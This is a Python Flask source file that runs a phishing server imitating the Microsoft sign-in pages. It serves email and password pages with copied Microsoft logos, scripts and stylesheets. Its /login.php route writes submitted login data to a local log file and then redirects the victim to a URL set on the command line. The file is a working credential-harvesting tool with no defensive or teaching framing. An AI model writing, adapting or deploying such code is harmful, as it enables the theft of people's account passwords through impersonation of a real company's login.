from flask import Flask, request, render_template, send_file, redirect
from werkzeug.datastructures import RequestCacheControl
import os

from sys import argv

url = argv[1]
host= argv[2]
port= int(argv[3])
app = Flask(__name__)
@app.route("/")
def hell():
    return render_template("email.html")



@app.route("/" , methods=["POST"])
def passwd():
    data = request.form.to_dict(flat=False)
    return render_template("password.html" , email=data["loginfmt"][0])
@app.route("/login.php" , methods=["POST", "GET"])
def reorient():
    data = request.form.to_dict(flat=False)
    with open("Log.txt" , "a") as file:
       file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
    return redirect(url)

@app.route("/templates/sprites/microsoft_logo.svg")
def Logo1():
    return send_file("templates\\sprites\\microsoft_logo.svg")

@app.route("/sprites/keyicon.svg")
def Logo2():
    return send_file("templates\\sprites\\keyicon.svg")

@app.route("/index_files/ConvergedLoginPaginatedStrings.EN.js")
def Logo3():
    return send_file("templates\\index_files\\ConvergedLoginPaginatedStrings.EN.js")
@app.route("/index_files/Converged_v21033.css")
def Logo4():
    return send_file("templates\\index_files\\Converged_v21033.css")


@app.route("/index_files/ConvergedLogin_PCore.js")
def Logo5():
    return send_file("templates\\index_files\\ConvergedLogin_PCore.js")

@app.route("/sprites/ellipsis_white.svg")
def Logo6():
    return send_file("templates\\sprites\\ellipsis_white.svg")

@app.route("/sprites/ellipsis_grey.svg")    
def Logo7():
    return send_file("templates\\sprites\\ellipsis_grey.svg")


@app.route("/sprites/microsoft_logo.svg")
def Logo8():
    return send_file("templates\\sprites\\microsoft_logo.svg")



app.run(host=host, port=port)